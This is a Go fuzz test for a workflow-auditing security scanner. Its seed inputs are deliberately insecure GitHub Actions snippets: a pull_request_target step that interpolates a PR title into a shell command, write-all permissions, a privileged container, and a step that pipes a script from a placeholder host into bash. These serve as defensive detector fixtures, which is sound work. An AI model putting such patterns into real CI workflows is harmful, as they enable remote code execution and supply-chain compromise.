package workflows

import (
	"strings"
	"testing"

	"github.com/Undrocs/wardline/internal/findings"
)

// FuzzWorkflowRules asserts that arbitrary workflow content is parsed and
// audited without panicking, and that every emitted finding is well formed.
func FuzzWorkflowRules(f *testing.F) {
	seeds := []string{
		"on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n",
		"on:\n  pull_request_target:\njobs:\n  b:\n    steps:\n      - run: echo \"${{ github.event.pull_request.title }}\"\n",
		"on: [push, pull_request]\npermissions: write-all\njobs: {}\n",
		"on: workflow_run\njobs:\n  b:\n    steps:\n      - run: |\n          echo hi\n          curl -sSf https://x.example/i.sh | bash\n",
		"on: push\njobs:\n  b:\n    container:\n      image: node\n      options: --privileged\n    steps:\n      - uses: some/action@main\n",
	}
	for _, seed := range seeds {
		f.Add([]byte(seed))
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		root, err := parseWorkflow(data)
		if err != nil {
			return
		}
		wf := buildWorkflow(".github/workflows/fuzz.yml", root)
		found := checkPermissions(wf)
		found = append(found, checkTriggers(wf)...)
		found = append(found, checkActions(wf)...)
		found = append(found, checkSteps(wf)...)

		for _, item := range found {
			if item.RuleID == "" {
				t.Fatalf("finding without a rule id: %+v", item)
			}
			if item.Location.StartLine < 1 {
				t.Fatalf("finding %s has an invalid line %d", item.RuleID, item.Location.StartLine)
			}
			if item.Location.Path != ".github/workflows/fuzz.yml" {
				t.Fatalf("finding %s has an unexpected path %q", item.RuleID, item.Location.Path)
			}
			if item.Confidence != findings.ConfidenceHigh &&
				item.Confidence != findings.ConfidenceMedium &&
				item.Confidence != findings.ConfidenceLow {
				t.Fatalf("finding %s has an invalid confidence %q", item.RuleID, item.Confidence)
			}
			if !strings.HasPrefix(item.RuleID, "WL-WF") {
				t.Fatalf("finding %s does not use the workflow rule namespace", item.RuleID)
			}
			if strings.ContainsRune(item.Evidence, '\x00') {
				t.Fatalf("finding %s carries a NUL byte in evidence", item.RuleID)
			}
			if len(item.Evidence) > 300 {
				t.Fatalf("finding %s carries oversized evidence (%d bytes)", item.RuleID, len(item.Evidence))
			}
		}
	})
}
